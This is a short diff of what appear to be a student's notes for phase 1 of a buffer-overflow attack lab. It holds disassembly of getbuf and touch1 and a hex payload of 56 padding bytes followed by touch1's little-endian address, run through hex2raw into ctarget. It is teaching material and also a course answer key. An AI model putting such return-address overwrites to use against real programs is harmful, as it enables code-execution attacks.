@@ -1,0 +1,35 @@
+phase 1:
+
+Dump of assembler code for function getbuf:
+   0x000000000040181b <+0>:	sub    $0x38,%rsp       reserves (dec) 56 bytes of space for storage
+   0x000000000040181f <+4>:	mov    %rsp,%rdi        (rdi often used to pass first arg to function)
+   0x0000000000401822 <+7>:	callq  0x401a53 <Gets>
+   0x0000000000401827 <+12>:	mov    $0x1,%eax    sets return val to 1 (eax typically used to return)
+   0x000000000040182c <+17>:	add    $0x38,%rsp
+   0x0000000000401830 <+21>:	retq   
+End of assembler dump.
+
+0000000000401831 <touch1>:
+  401831:	48 83 ec 08          	sub    $0x8,%rsp                  401831 - address of touch1
+  401835:	c7 05 bd 3c 20 00 01 	movl   $0x1,0x203cbd(%rip)        # 6054fc <vlevel>
+  40183c:	00 00 00 
+  40183f:	bf c6 30 40 00       	mov    $0x4030c6,%edi
+  401844:	e8 27 f4 ff ff       	callq  400c70 <puts@plt>
+  401849:	bf 01 00 00 00       	mov    $0x1,%edi
+  40184e:	e8 17 05 00 00       	callq  401d6a <validate>
+  401853:	bf 00 00 00 00       	mov    $0x0,%edi
+  401858:	e8 73 f5 ff ff       	callq  400dd0 <exit@plt>
+
+solution: 
+56 bytes of padding + 401831 address of touch1 --> little endian 31 18 40:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00
+31 18 40 00 00 00 00 00
+
+./hex2raw < phase1.txt > raw-phase1.txt
+./ctarget < raw-phase1.txt
